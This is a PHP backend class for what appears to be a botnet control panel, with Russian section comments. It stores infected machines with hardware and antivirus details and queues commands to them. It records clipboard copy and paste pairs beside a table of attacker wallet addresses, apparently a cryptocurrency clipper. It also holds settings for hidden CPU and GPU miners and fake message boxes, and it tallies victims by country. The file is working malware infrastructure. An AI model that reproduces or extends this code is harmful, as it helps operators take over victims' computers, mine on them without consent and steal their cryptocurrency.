<?php
require_once($_SERVER['DOCUMENT_ROOT']."/php/DB.class.php");


//
//	Боты
//	Команды
//	Клипы
//	Настройки
//

	class Data {
		private $db;
		
		function __construct(){
			$this->db = new DB();
		}
		
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
//					Боты
//
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

		function AddBot($hwid, $ip, $country_code, $bit, $win, $cpu, $gpu, $av) {
			$this->db->addRow(
				"bots", 
				[
					["hwid", "=", $hwid],
					["ip", "=", $ip],
					["country", "=", $country_code],
					["bit", "=", $bit],
					["win", "=", $win],
					["cpu", "=", $cpu],
					["gpu", "=", $gpu],
					["av", "=", $av],
					["time", "=", time()],
					["last_online", "=", time()],
					["last_online_date", "=", date("H:i d.m.Y")]
				]
			);
		}
		
		function CheckBot($hwid, $win = null) {
			$fieldsAndValues = [];
			$fieldsAndValues[] = ["hwid", "=", $hwid];
			if ($win !== null) $fieldsAndValues[] = ["win", "=", $win];
			
			return $this->db->checkRow(
				"bots", 
				$fieldsAndValues 
			);
		}
		
		function CountBots() {
			return $this->db->countAllRows("bots");
		}
		
		function CountOnlineBots() {
			return $this->db->countRows(
				"bots", 
				[
					["last_online", ">=", time() - ((self::GetReconnectTime() * 60) * 2)]
				]
			);
		}
		
		function Count24hOnlineBots() {
			return $this->db->countRows(
				"bots", 
				[
					["last_online", ">=", time() - 86400]
				]
			);
		}
		
		function DeleteOldBots() {
			$this->db->deleteRow(
				"bots", 
				[
					["last_online", "<=", time() - 86400 * 4]
				]
			);
		}
		
		function GetBots() {
			return $this->db->getListRows(
				"bots"
			);
		}
		
		function GetWindowsCount() {
			$WindowsXP = $this->db->countRows(
				"bots",
				[
					["win", "LIKE", "%windows xp%"]
				]
			);
			$WindowsVista = $this->db->countRows(
				"bots",
				[
					["win", "LIKE", "%windows vista%"]
				]
			);
			$Windows7 = $this->db->countRows(
				"bots",
				[
					["win", "LIKE", "%windows 7%"]
				]
			);
			$Windows8 = $this->db->countRows(
				"bots",
				[
					["win", "LIKE", "%windows 8%"]
				]
			);
			$Windows81 = $this->db->countRows(
				"bots",
				[
					["win", "LIKE", "%windows 8.1%"]
				]
			);
			$Windows10 = $this->db->countRows(
				"bots",
				[
					["win", "LIKE", "%windows 10%"]
				]
			);
			
			$All = self::CountBots();
			$Other = $All - ($WindowsXP + $WindowsVista + $Windows7 + $Windows8 + $Windows81 + $Windows10);
			
			return [
				"Windows10" => $Windows10,
				"Windows81" => $Windows81,
				"Windows8" => $Windows8,
				"Windows7" => $Windows7,
				"WindowsVista" => $WindowsVista,
				"WindowsXP" => $WindowsXP,
				"Other" => $Other,
			];
		}
		
		function GetVideocardsCount() {
			$Nvidia = $this->db->countRows(
				"bots",
				[
					["gpu", "LIKE", "%nvidia%"]
				]
			);
			$AMD = $this->db->countRows(
				"bots",
				[
					["gpu", "LIKE", "%amd%"]
				]
			);
			
			$All = self::CountBots();
			$Other = $All - ($Nvidia + $AMD);
			
			return [
				"Nvidia" => $Nvidia,
				"AMD" => $AMD,
				"Other" => $Other
			];
		}
		
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
//					Команды
//
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

		function AddTask($task, $max_executions = 0, $directed = false, $destination = null) {
			$fieldsAndValues = [
				["task", "=", $task],
				["time", "=", time()],
				["date", "=", date("H:i d.m.Y")],
				["active", "=", 1]
			];
			
			if ($max_executions > 0) {
				$fieldsAndValues[] = ["max_executions", "=", $max_executions];
			}
			
			if ($directed) {
				$fieldsAndValues[] = ["directed", "=", 1];
				$fieldsAndValues[] = ["destination", "=", $destination];
			}
			
			$this->db->addRow(
				"tasks", 
				$fieldsAndValues
			);
		}
		
		function CheckActiveTasks() {
			$result = $this->db->countRows(
				"tasks", 
				[
					["active", "=", 1]
				]
			);
			
			return ($result > 0);
		}
		
		function GetActiveTasks() {
			return $this->db->getRows(
				"tasks", 
				[
					["active", "=", 1],
					["directed", "=", 0]
				]
			);
		}
		
		function CheckActiveTasksByHWID($hwid) {
			$result = $this->db->countRows(
				"tasks", 
				[
					["destination", "=", $hwid],
					["active", "=", 1]
				]
			);
			
			return ($result > 0);
		}
		
		function GetActiveTasksByHWID($hwid) {
			return $this->db->getRows(
				"tasks", 
				[
					["destination", "=", $hwid],
					["active", "=", 1]
				]
			);
		}
		
		function CancelTask($task_id) {
			$this->db->updateRow(
				"tasks", 
				[
					["id", "=", $task_id]
				], 
				[
					["active", "=", 0]
				]
			);
		}
		
		function GetTasks() {
			return $this->db->getListRows(
				"tasks"
			);
		}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
//					Клипы
//
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

		function AddClip($hwid, $type, $copy, $paste) {
			$this->db->addRow(
				"clips", 
				[
					["hwid", "=", $hwid],
					["type", "=", $type],
					["copy", "=", $copy],
					["paste", "=", $paste],
					["time", "=", time()],
					["date", "=", date("H:i d.m.Y")]
				]
			);
		}
		
		function CountClips() {
			return $this->db->countAllRows("clips");
		}
		
		function Count24hClips() {
			return $this->db->countRows(
				"clips", 
				[
					["time", ">=", time() - 86400]
				]
			);
		}
		
		function CountUniquePC() {
			return $this->db->countUniqueValues("clips", "hwid");
		}
		
		function GetLastClipTime() {
			$lastClip = $this->db->getLastRow("clips");
			$lastClipTime = $lastClip["time"];
			
			if ($lastClipTime == 0) return 0;
			else {
				$deltaTime = time() - $lastClipTime;
				$hours = round($deltaTime / 3600);
				return $hours;
			}
		}
		
		function GetClips() {
			return $this->db->getListRows(
				"clips"
			);
		}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
//					Настройки
//
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		
		function CheckPassword($password) {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "passhash"]
				]
			);
			
			if(md5($password . "zgnfhfksdh") == $rows[0]["value"]) return true;
			else return false;
		}
		
		function SetPassword($password) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "passhash"]
				], 
				[
					["value", "=", md5($password . "zgnfhfksdh")]
				]
			);
		}
		
		function SetReconnectTime($time) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "reconnect_time"]
				], 
				[
					["value", "=", $time]
				]
			);
		}
		
		function GetReconnectTime() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "reconnect_time"]
				]
			);
			
			return $rows[0]["value"];
		}

		
		
		function SetCPU($cpu) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "cpu"]
				], 
				[
					["value", "=", $cpu]
				]
			);
		}
		
		function GetCPU() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "cpu"]
				]
			);
			
			return $rows[0]["value"];
		}

		function SetCPUParams($text) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "cpuConfig"]
				], 
				[
					["value", "=", $text]
				]
			);
		}
		
		function GetCPUParams() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "cpuConfig"]
				]
			);
			
			return $rows[0]["value"];
		}

		function SetCPULink($text) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "cpuLink"]
				], 
				[
					["value", "=", $text]
				]
			);
		}
		
		function GetCPULink() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "cpuLink"]
				]
			);
			
			return $rows[0]["value"];
		}

		function SetGPUAMD($gpuAMD) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "gpuAMD"]
				], 
				[
					["value", "=", $gpuAMD]
				]
			);
		}
		
		
		
		function GetGPUAMD() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "gpuAMD"]
				]
			);
			
			return $rows[0]["value"];
		}

		function SetGPUAMDParams($text) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "gpuAMDConfig"]
				], 
				[
					["value", "=", $text]
				]
			);
		}
		
		function GetGPUAMDParams() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "gpuAMDConfig"]
				]
			);
			
			return $rows[0]["value"];
		}

		function SetGPUAMDFiles($text) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "gpuAMDFiles"]
				], 
				[
					["value", "=", $text]
				]
			);
		}
		
		function GetGPUAMDFiles() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "gpuAMDFiles"]
				]
			);
			
			return $rows[0]["value"];
		}

		
		
		function SetGPUNvidia($gpuNVIDIA) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "gpuNVIDIA"]
				], 
				[
					["value", "=", $gpuNVIDIA]
				]
			);
		}
		
		function GetGPUNvidia() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "gpuNVIDIA"]
				]
			);
			
			return $rows[0]["value"];
		}

		function SetGPUNvidiaParams($text) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "gpuNVIDIAConfig"]
				], 
				[
					["value", "=", $text]
				]
			);
		}
		
		function GetGPUNvidiaParams() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "gpuNVIDIAConfig"]
				]
			);
			
			return $rows[0]["value"];
		}

		function SetGPUNvidiaFiles($text) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "gpuNVIDIAFiles"]
				], 
				[
					["value", "=", $text]
				]
			);
		}
		
		function GetGPUNvidiaFiles() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "gpuNVIDIAFiles"]
				]
			);
			
			return $rows[0]["value"];
		}
		
		
		
		function SetMessadgebox($messagebox) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "messagebox"]
				], 
				[
					["value", "=", $messagebox]
				]
			);
		}
		
		function GetMessadgebox() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "messagebox"]
				]
			);
			
			return $rows[0]["value"];
		}
		
		function SetMessadgeboxText($messageboxText) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "messageboxText"]
				], 
				[
					["value", "=", $messageboxText]
				]
			);
		}
		
		function GetMessadgeboxText() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "messageboxText"]
				]
			);
			
			return $rows[0]["value"];
		}
		
		function SetMessadgeboxCaption($messageboxCaption) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "messageboxCaption"]
				], 
				[
					["value", "=", $messageboxCaption]
				]
			);
		}
		
		function GetMessadgeboxCaption() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "messageboxCaption"]
				]
			);
			
			return $rows[0]["value"];
		}
		
		function SetMessadgeboxImage($messageboxImage) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "messageboxImage"]
				], 
				[
					["value", "=", $messageboxImage]
				]
			);
		}
		
		function GetMessadgeboxImage() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "messageboxImage"]
				]
			);
			
			return $rows[0]["value"];
		}
		
		function SetMessadgeboxButton($messageboxButton) {
			$this->db->updateRow(
				"settings", 
				[
					["name", "=", "messageboxButton"]
				], 
				[
					["value", "=", $messageboxButton]
				]
			);
		}
		
		function GetMessadgeboxButton() {
			$rows = $this->db->getRows(
				"settings", 
				[
					["name", "=", "messageboxButton"]
				]
			);
			
			return $rows[0]["value"];
		}
		
		function GetWallets() {
			$rows = $this->db->getListRows("wallets");
			
			$output = [];
			foreach ($rows as $key => $value) {
				$output[] = [$value["name"], $value["value"]];
			}
			
			return $output;
		}
		
		function SetWallets($wallets) {
			foreach ($wallets as $key => $value) {
				$this->db->updateRow(
					"wallets", 
					[
						["name", "=", $key]
					], 
					[
						["value", "=", $value]
					]
				);
			}
		}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
//					Статистика
//
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		
		function GetWeeklyNewBots() {
			$rows = $this->db->getRows(
				"stats", 
				[
					["name", "=", "weeklyNewBots"]
				]
			);
			
			return json_decode($rows[0]["value"]);
		}
		
		function GetWeeklyOnline() {
			$rows = $this->db->getRows(
				"stats", 
				[
					["name", "=", "weeklyOnline"]
				]
			);
			
			return json_decode($rows[0]["value"]);
		}
		
		function GetCryptostats() {
			$btc_data = json_decode(file_get_contents("https://api.coinmarketcap.com/v1/ticker/bitcoin/?convert=RUB"), true);
			$eth_data = json_decode(file_get_contents("https://api.coinmarketcap.com/v1/ticker/ethereum/?convert=RUB"), true);
			$bch_data = json_decode(file_get_contents("https://api.coinmarketcap.com/v1/ticker/bitcoin-cash/?convert=RUB"), true);
			$ltc_data = json_decode(file_get_contents("https://api.coinmarketcap.com/v1/ticker/litecoin/?convert=RUB"), true);
				
			return [
				"BTC" => [
					"usd" => round($btc_data[0]["price_usd"], 1),
					"rub" => round($btc_data[0]["price_rub"], 1),
					"24h" => ($btc_data[0]["percent_change_24h"] < 0) ? 
								"<span class='text-danger text-semibold'><i class='fa fa-level-down' aria-hidden='true'></i> " . $btc_data[0]["percent_change_24h"] . "</span>" :
								"<span class='text-success text-semibold'><i class='fa fa-level-up' aria-hidden='true'></i> " . $btc_data[0]["percent_change_24h"] . "</span>"
				], 
				"ETH" => [
					"usd" => round($eth_data[0]["price_usd"], 1),
					"rub" => round($eth_data[0]["price_rub"], 1),
					"24h" => ($eth_data[0]["percent_change_24h"] < 0) ? 
								"<span class='text-danger text-semibold'><i class='fa fa-level-down' aria-hidden='true'></i> " . $eth_data[0]["percent_change_24h"] . "</span>" :
								"<span class='text-success text-semibold'><i class='fa fa-level-up' aria-hidden='true'></i> " . $eth_data[0]["percent_change_24h"] . "</span>"
				], 
				"BTH" => [
					"usd" => round($bch_data[0]["price_usd"], 1),
					"rub" => round($bch_data[0]["price_rub"], 1),
					"24h" => ($bch_data[0]["percent_change_24h"] < 0) ? 
								"<span class='text-danger text-semibold'><i class='fa fa-level-down' aria-hidden='true'></i> " . $bch_data[0]["percent_change_24h"] . "</span>" :
								"<span class='text-success text-semibold'><i class='fa fa-level-up' aria-hidden='true'></i> " . $bch_data[0]["percent_change_24h"] . "</span>"
				], 
				"LTC" => [
					"usd" => round($ltc_data[0]["price_usd"], 1),
					"rub" => round($ltc_data[0]["price_rub"], 1),
					"24h" => ($ltc_data[0]["percent_change_24h"] < 0) ? 
								"<span class='text-danger text-semibold'><i class='fa fa-level-down' aria-hidden='true'></i> " . $ltc_data[0]["percent_change_24h"] . "</span>" :
								"<span class='text-success text-semibold'><i class='fa fa-level-up' aria-hidden='true'></i> " . $ltc_data[0]["percent_change_24h"] . "</span>"
				]
			];
		}
		
		function GetCountriesStats() {
			$botsData = [ 
				"AF" => 0, "AL" => 0, "DZ" => 0, "AO" => 0, "AG" => 0, "AR" => 0, "AM" => 0, "AU" => 0, "AT" => 0,
				"AZ" => 0, "BS" => 0, "BH" => 0, "BD" => 0, "BB" => 0, "BY" => 0, "BE" => 0, "BZ" => 0, "BJ" => 0,
				"BT" => 0, "BO" => 0, "BA" => 0, "BW" => 0, "BR" => 0, "BN" => 0, "BG" => 0, "BF" => 0, "BI" => 0,
				"KH" => 0, "CM" => 0, "CA" => 0, "CV" => 0, "CF" => 0, "TD" => 0, "CL" => 0, "CN" => 0, "CO" => 0,
				"KM" => 0, "CD" => 0, "CG" => 0, "CR" => 0, "CI" => 0, "HR" => 0, "CY" => 0, "CZ" => 0, "DK" => 0,
				"DJ" => 0, "DM" => 0, "DO" => 0, "EC" => 0, "EG" => 0, "SV" => 0, "GQ" => 0, "ER" => 0, "EE" => 0,
				"ET" => 0, "FJ" => 0, "FI" => 0, "FR" => 0, "GA" => 0, "GM" => 0, "GE" => 0, "DE" => 0, "GH" => 0,
				"GR" => 0, "GD" => 0, "GT" => 0, "GN" => 0, "GW" => 0, "GY" => 0, "HT" => 0, "HN" => 0, "HK" => 0,
				"HU" => 0, "IS" => 0, "IN" => 0, "ID" => 0, "IR" => 0, "IQ" => 0, "IE" => 0, "IL" => 0, "IT" => 0,
				"JM" => 0, "JP" => 0, "JO" => 0, "KZ" => 0, "KE" => 0, "KI" => 0, "KR" => 0, "KW" => 0, "KG" => 0,
				"LA" => 0, "LV" => 0, "LB" => 0, "LS" => 0, "LR" => 0, "LY" => 0, "LT" => 0, "LU" => 0, "MK" => 0,
				"MG" => 0, "MW" => 0, "MY" => 0, "MV" => 0, "ML" => 0, "MT" => 0, "MR" => 0, "MU" => 0, "MX" => 0,
				"MD" => 0, "MN" => 0, "ME" => 0, "MA" => 0, "MZ" => 0, "MM" => 0, "NA" => 0, "NP" => 0, "NL" => 0,
				"NZ" => 0, "NI" => 0, "NE" => 0, "NG" => 0, "NO" => 0, "OM" => 0, "PK" => 0, "PA" => 0, "PG" => 0,
				"PY" => 0, "PE" => 0, "PH" => 0, "PL" => 0, "PT" => 0, "QA" => 0, "RO" => 0, "RU" => 0, "RW" => 0,
				"WS" => 0, "ST" => 0, "SA" => 0, "SN" => 0, "RS" => 0, "SC" => 0, "SL" => 0, "SG" => 0, "SK" => 0,
				"SI" => 0, "SB" => 0, "ZA" => 0, "ES" => 0, "LK" => 0, "KN" => 0, "LC" => 0, "VC" => 0, "SD" => 0,
				"SR" => 0, "SZ" => 0, "SE" => 0, "CH" => 0, "SY" => 0, "TW" => 0, "TJ" => 0, "TZ" => 0, "TH" => 0,
				"TL" => 0, "TG" => 0, "TO" => 0, "TT" => 0, "TN" => 0, "TR" => 0, "TM" => 0, "UG" => 0, "UA" => 0,
				"AE" => 0, "GB" => 0, "US" => 0, "UY" => 0, "UZ" => 0, "VU" => 0, "VE" => 0, "VN" => 0, "YE" => 0,
				"ZM" => 0, "ZW" => 0, "UNDEFINED" => 0
			];
			
			$countries = $this->db->getUniqueValues("bots", "country");
			
			foreach($countries as $v) {
				$botsData[$v] = $this->db->countRows(
					"bots", 
					[
						["country", "=", $v]
					]
				);
			}
			
			return $botsData;
		}
		
		function GetTopCountries() {
			$allBots = self::CountBots();
			$botsData = self::GetCountriesStats();
			
			foreach($botsData as $k => $v) 
				if ($v == 0) unset($botsData[$k]);
			
			asort($botsData);
			
			foreach($botsData as $k => $v)
				$botsData[$k] = ["count" => $v, "percent" => $v / $allBots * 100];
			
			return $botsData;
		}
		
	}

?>